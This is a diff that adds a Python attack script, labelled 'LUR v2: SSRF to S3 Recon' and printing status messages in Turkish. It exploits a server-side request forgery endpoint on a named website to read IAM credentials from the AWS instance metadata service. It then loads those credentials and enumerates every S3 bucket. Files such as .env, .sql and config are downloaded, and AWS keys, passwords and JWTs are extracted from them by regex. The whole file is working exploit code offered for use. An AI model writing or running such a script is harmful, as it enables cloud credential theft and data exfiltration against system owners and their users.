@@ -1,0 +1,84 @@
+import requests
+import json
+import os
+import subprocess
+import re
+
+TARGET_URL = "https://aburcubur.com/fetch-article"
+HEADERS = {"Content-Type": "application/json"}
+
+def send_ssrf(target):
+    payload = {"url": target}
+    response = requests.post(TARGET_URL, headers=HEADERS, data=json.dumps(payload))
+    return response.text.strip()
+
+def get_iam_role():
+    print("[*] IAM Role çekiliyor...")
+    return send_ssrf("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+
+def get_iam_creds(role_name):
+    print("[*] Credential'lar alınıyor...")
+    response = send_ssrf(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}")
+    return json.loads(response)
+
+def export_creds(creds):
+    print("[*] AWS ortamı ayarlanıyor...")
+    os.environ["AWS_ACCESS_KEY_ID"] = creds["AccessKeyId"]
+    os.environ["AWS_SECRET_ACCESS_KEY"] = creds["SecretAccessKey"]
+    os.environ["AWS_SESSION_TOKEN"] = creds["Token"]
+
+def list_buckets():
+    print("[*] Bucket'lar listeleniyor...")
+    result = subprocess.getoutput("aws s3 ls")
+    buckets = [line.split()[-1] for line in result.strip().split("\n") if line]
+    return buckets
+
+def scan_bucket(bucket):
+    print(f"\n🔍 {bucket} taranıyor...")
+    result = subprocess.getoutput(f"aws s3 ls s3://{bucket}/ --recursive")
+    files = [line.split()[-1] for line in result.strip().split("\n") if line]
+    sensitive = [f for f in files if any(x in f.lower() for x in ['.env', '.sql', '.log', 'config', 'secret'])]
+    return sensitive
+
+def download_and_extract(bucket, files):
+    for f in files:
+        path = f"s3://{bucket}/{f}"
+        print(f"[↓] İndiriliyor: {path}")
+        subprocess.call(["aws", "s3", "cp", path, "."])
+        with open(f.split("/")[-1], "r", encoding="utf-8", errors="ignore") as file:
+            content = file.read()
+            extract_secrets(content)
+
+def extract_secrets(text):
+    print("[🧪] Secret analiz yapılıyor...")
+    patterns = {
+        "AWS_KEY": r"AKIA[0-9A-Z]{16}",
+        "SECRET_KEY": r"(?i)(secret|password|token)[^\n]{0,50}",
+        "JWT": r"eyJ[a-zA-Z0-9_\-]+?\.[a-zA-Z0-9_\-]+?\.[a-zA-Z0-9_\-]+"
+    }
+    for name, pattern in patterns.items():
+        found = re.findall(pattern, text)
+        for match in found:
+            print(f"[⚠️] {name} bulundu: {match.strip()}")
+
+def main():
+    print("== LUR v2: SSRF to S3 Recon ==")
+    role = get_iam_role()
+    if not role:
+        print("[-] IAM role alınamadı.")
+        return
+
+    creds = get_iam_creds(role)
+    export_creds(creds)
+
+    buckets = list_buckets()
+    for bucket in buckets:
+        files = scan_bucket(bucket)
+        if files:
+            print(f"[+] Hassas dosyalar bulundu: {files}")
+            download_and_extract(bucket, files)
+        else:
+            print(f"[-] {bucket} içinde hassas dosya bulunamadı.")
+
+if __name__ == "__main__":
+    main()
